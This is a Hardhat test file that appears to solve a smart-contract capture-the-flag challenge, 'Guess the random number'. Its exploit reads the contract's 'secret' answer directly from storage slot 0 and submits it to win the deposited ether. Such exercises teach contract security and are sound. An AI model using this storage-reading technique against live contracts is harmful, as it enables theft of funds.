const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Guess the random number challenge', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer);
        this.guessRandomNumber = await Factory.deploy({value: ethers.utils.parseUnits("1")});
    });

    it('Exploit', async function () {
        let attackerInstance = await this.guessRandomNumber.connect(attacker)
        let answer = await ethers.provider.getStorageAt(attackerInstance.address, 0)
        await attackerInstance.guess(answer, {value: ethers.utils.parseUnits("1")})
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.guessRandomNumber.isComplete()
        ).to.be.eq(true);
    });
});